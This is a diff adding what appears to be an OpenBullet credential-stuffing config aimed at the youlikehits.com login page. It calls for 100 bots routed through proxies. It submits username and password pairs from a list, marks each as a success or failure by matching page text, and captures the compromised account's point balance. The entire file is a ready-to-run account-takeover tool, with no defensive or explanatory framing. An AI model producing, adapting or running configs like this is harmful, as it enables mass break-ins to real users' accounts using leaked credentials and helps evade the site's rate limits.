@@ -1,0 +1,44 @@
+[SETTINGS]
+{
+  "Name": "youlikehits",
+  "SuggestedBots": 100,
+  "LastModified": "2019-05-24T09:39:30.710779+00:00",
+  "AdditionalInfo": "",
+  "Author": "ahmedalaa",
+  "Version": "1.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST POST "https://www.youlikehits.com/login.php?step=login" 
+  CONTENT "username=<USER>&pass=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Origin: https://www.youlikehits.com" 
+  HEADER "Referer: https://www.youlikehits.com/login.php" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<meta NAME=\"keywords\" CONTENT=\"Get Twitter Followers, Free YouTube Views, Get Website Hits, Pinterest Followers, SoundCloud Plays\">" 
+  KEYCHAIN Failure OR 
+    KEY "We couldn't find an account matching the username and password you entered.</b><br>This means that the account doesn't exist or you entered the wrong information." 
+
+PARSE "<SOURCE>" LR ":#AEDAE9;\">Points:</a>&nbsp;<span id=\"currentpoints\" style=\"color:#fff;font-size:15px;\">" "</span>&nbsp;&nbsp;&nbsp;<a href=\"premium.php\" title=\"Become Premium\" style=\"font-size:15px;color:#aee9b4;\"><b>Become Premium!</b></a></font>&nbsp;&nbsp;&nbsp;<a href=\"account.php\" class=\"viewhistory\">My Account</a>&nbsp;<" -> CAP "points" 
+
